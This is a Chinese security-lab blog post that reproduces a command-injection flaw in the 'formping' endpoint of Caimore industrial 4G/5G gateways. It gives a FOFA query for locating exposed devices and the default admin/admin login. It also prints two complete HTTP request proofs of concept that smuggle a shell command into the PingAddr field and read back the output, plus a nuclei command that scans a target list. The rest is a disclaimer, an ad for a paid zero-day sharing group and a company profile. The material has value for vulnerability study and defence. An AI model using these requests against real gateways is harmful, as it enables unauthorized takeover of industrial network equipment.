#  漏洞复现 才茂通信 网关 formping 远程命令执行漏洞

by 融云安全-sm  [ 融云攻防实验室 ](javascript:void\(0\);)

**融云攻防实验室** ![]()

微信号 gh_0dba7ff3f653

功能介绍 网络安全舆情快报

____

___发表于_

收录于合集

#漏洞复现 272 个

#才茂通信 1 个

**0x01  漏洞描述**

厦门才茂网关，采用开放式软件架构设计，是一款金属外壳设计，带4路千兆LAN、1路千兆WAN，采用 3G/4G/5G
广域网络上网通信的工业级设计无线网关，支持2.4GWiFi和5.8GWiFi。厦门才茂网关系统formping存在命令执行漏洞，攻击者通过漏洞可以执行任意命令，导致服务器失陷。![]()

 **0x02  漏洞复现**

 **fofa** **：** app="CAIMORE-Gateway"

1.弱口令admin-admin登录，通过漏洞执行ls命令，得到回显

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    POC1:POST /goform/formping HTTP/1.1Host: {{Hostname}}User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36Connection: closeContent-Length: 63Authorization: Basic YWRtaW46YWRtaW4=Accept-Encoding: gzip  
    PingAddr=127.0.0.1%7Cecho%20hellocaimao&PingPackNumb=1&PingMsg=  
    POC2:GET /pingmessages HTTP/1.1Host: {{Hostname}}User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36Connection: closeAuthorization: Basic YWRtaW46YWRtaW4=Accept-Encoding: gzip

![]()

![]()

2.nuclei验证脚本已发表于知识星球 ****

  * 

    
    
    nuclei.exe -t caimao-gateway-formping-rce.yaml -l subs.txt -stats

![]()

 **(注：本文章为技术分享，禁止任何非授权攻击行为** **)**

  

 **** **网络安全神兵利器分享** **网络安全漏洞N/0day分享** **    加入星球请扫描下方二维码，更多精，敬请期待！**👇👇👇

![]()

 **0x04   ** **公司简介******

江西渝融云安全科技有限公司，2017年发展至今，已成为了一家集云安全、物联网安全、数据安全、等保建设、风险评估、信息技术应用创新及网络安全人才培训为一体的本地化高科技公司，是江西省信息安全产业链企业和江西省政府部门重点行业网络安全事件应急响应队伍成员。  
    公司现已获得信息安全集成三级、信息系统安全运维三级、风险评估三级等多项资质认证，拥有软件著作权十八项；荣获2020年全国工控安全深度行安全攻防对抗赛三等奖；庆祝建党100周年活动信息安全应急保障优秀案例等荣誉......

 **编制：sm**

 **审核：fjh**

 **审核：Dog**

 **  
**

 ** **1个![]()** 1朵 ** ** ** ** ** **![]()************** **** **5毛钱**

 **天天搬砖的小M**

 **能不能吃顿好的**

 **就看你们的啦**

 ** **![]()****

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

